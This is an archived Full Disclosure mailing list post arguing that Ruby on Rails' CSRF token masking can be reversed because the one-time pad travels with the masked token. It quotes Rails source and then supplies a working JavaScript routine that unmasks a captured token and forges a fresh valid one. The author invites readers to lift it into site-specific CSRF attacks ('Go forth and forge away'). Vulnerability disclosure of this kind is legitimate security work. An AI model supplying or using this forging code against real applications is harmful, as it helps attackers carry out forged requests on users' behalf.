---
title: Ruby on Rails Cross-Site Request Forgery
url: https://seclists.org/fulldisclosure/2025/Apr/29
source: Full Disclosure
date: 2025-04-28
fetch_date: 2025-10-06T22:05:28.362833
---

# Ruby on Rails Cross-Site Request Forgery

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

![](/shared/images/nst-icons.svg#search)

# Ruby on Rails Cross-Site Request Forgery

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Sat, 26 Apr 2025 06:45:42 +0000

---

```
Good morning.  All current versions and all versions since the 2022/2023 "fix" to the Rails cross-site request forgery
(CSRF) protections continue to be vulnerable to the same attacks as the 2022 implementation.  Currently, Rails
generates "authenticity tokens" and "csrf tokens" using a random "one time pad" (OTP).  This random value is then XORed
with the "raw token" (which can take one of two forms based on if per-form CSRF protections are in place).  Rails then,
incorrectly, packages both the OTP and the XORed "raw token" together (through basic string concatenation) to form a
"masked token", which is what is then sent to the user.  Since the key (in this case the OTP) is included with the
"ciphertext", attackers can "decrypt" the "encrypted CSRF token", generate their own random value (OTP), and then
recreate the token or simply replay the token.  Forging of the "raw token" can also be performed.  Below is some of the
offending code from Rails main branch's request_forgery_protection.rb:

      # Creates a masked version of the authenticity token that varies on each
      # request. The masking is used to mitigate SSL attacks like BREACH.
      def masked_authenticity_token(form_options: {})
        action, method = form_options.values_at(:action, :method)

        raw_token = if per_form_csrf_tokens && action && method
          action_path = normalize_action_path(action)
          per_form_csrf_token(nil, action_path, method)
        else
          global_csrf_token
        end

        mask_token(raw_token)
      end

...

      def mask_token(raw_token) # :doc:
        one_time_pad = SecureRandom.random_bytes(AUTHENTICITY_TOKEN_LENGTH)
        encrypted_csrf_token = xor_byte_strings(one_time_pad, raw_token)
        masked_token = one_time_pad + encrypted_csrf_token
        encode_csrf_token(masked_token)
      end

...

      def real_csrf_token(_session = nil) # :doc:
        csrf_token = request.env.fetch(CSRF_TOKEN) do
          request.env[CSRF_TOKEN] = csrf_token_storage_strategy.fetch(request) || generate_csrf_token
        end

        decode_csrf_token(csrf_token)
      end

      def per_form_csrf_token(session, action_path, method) # :doc:
        csrf_token_hmac(session, [action_path, method.downcase].join("#"))
      end

...

      def csrf_token_hmac(session, identifier) # :doc:
        OpenSSL::HMAC.digest(
          OpenSSL::Digest::SHA256.new,
          real_csrf_token(session),
          identifier
        )
      end

...

      def real_csrf_token(_session = nil) # :doc:
        csrf_token = request.env.fetch(CSRF_TOKEN) do
          request.env[CSRF_TOKEN] = csrf_token_storage_strategy.fetch(request) || generate_csrf_token
        end

        decode_csrf_token(csrf_token)
      end

      def per_form_csrf_token(session, action_path, method) # :doc:
        csrf_token_hmac(session, [action_path, method.downcase].join("#"))
      end

For a simple JavaScript-based tool that can take any given CSRF token and forge a new token that has the same valid
"raw token", see the below.  The code can easily be lifted and put into some website-specific CSRF attack (how you get
your tokens is your business):

/**
* This method returns the "one time pad", extracting it from the full, base64 encoded token.
*
 * @param {string} full_token - The base64-encoded nonce intended to provide CSRF protections
* @return {Uint8Array} The "one time pad" as a byte array
*/
function getOpt(full_token) {
    var decoded_token = Uint8Array.from(atob(full_token), b => b.charCodeAt(0));
    return decoded_token.subarray(0, 32);
}

/**
* This method returns the raw (XORed) token from the CSRF token.  The "raw token" is defined by Rails as the CSRF
token, which can either be global (per-form CSRF protections are disabled) or per-form (in which case it's a SHA256
hash of the session, action, and method).
*
 * @param {string} full_token - The base64-encoded nonce intended to provide CSRF protections
* @return {Uint8Array} The "raw token" as a byte array
*/
function getRawToken(full_token) {
    var decoded_token = Uint8Array.from(atob(full_token), b => b.charCodeAt(0));
    var otp = decoded_token.subarray(0, 32);
    var masked_token = decoded_token.subarray(32);
    var raw_token = new Uint8Array(masked_token.length);

    // XOR the OTP and "masked token"
    for(var i = 0; i < masked_token.length; i++) {
        raw_token[i] = (otp[i] ^ masked_token[i]) & 0xFF;
    }
    return raw_token;
}

/**
* This method returns a new cross-site request forgery token (CSRF) using the given "one time pad" and "raw token".
*
 * @param {Uint8Array} otp - The "one time pad" that we are going to make the masked token with
* @param {Uint8Array} raw_token - The byte array that is the "raw token"
* @return {String} The new CSRF token
*/
function getCsrfToken(otp, raw_token) {
    var masked_token = new Uint8Array(raw_token.length);

    // XOR the OTP and "raw token"
    for(var i = 0; i < raw_token.length; i++) {
        masked_token[i] = (otp[i] ^ raw_token[i]) & 0xFF;
    }

    // Merge the OTP and masked token into a single array
    var csrf_token = new Uint8Array(otp.length + masked_token.length);
    csrf_token.set(otp);
    csrf_token.set(masked_token, otp.length);

    // Base64 and remove the padding (because they remove it in Rails)
    return btoa(Array.from(csrf_token, b => String.fromCharCode(b)).join('')).replace(/=+$/, '');
}

/**
* This method is a "helper method" that is just here for looks.......
*
 * @param {Uint8Array} bytes - The byte array to turn into a hex string
* @return {String} A pretty hexidecimal string representation of the given array
*/
function byteArrayToHexString(bytes) {
    var hex_string = "";
    for(var i = 0; i < bytes.length; i++) {
        hex_string += ('0' + (bytes[i] & 0xFF).toString(16)).slice(-2);
    }
    return hex_string;
}

// Replace this with the stolen token or have your CSRF POC grab the token from the page and use that
var token = "INSERT YOUR TOKEN HERE";

// Change the OTP to something else
var otp = getOpt(token);
otp[0] = 0xFF;
otp[1] = 0x00;

// Prove that we produce the same raw token, which is all that matters
if(byteArrayToHexString(getRawToken(token)) == byteArrayToHexString(getRawToken(getCsrfToken(otp,
getRawToken(token))))){
    console.log("The new token that works is: " + getCsrfToken(otp, getRawToken(token)));
    console.log("Go forth and forge away...");
}
else {
    console.log("We failed as testers/programmers...");
}

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](28)
[By Date](date.html#29)
[![Next](/images/right-icon-16x16.png)](30)

[![Previous](/images/left-icon-16x16.png)](28)
[By Thread](index.html#29)
[![Next](/images/right-icon-16x16.png)](30)

### Current thread:

* **Ruby on Rails Cross-Site Request Forgery** *Daniel Owens via Fulldisclosure (Apr 26)*

![](/s...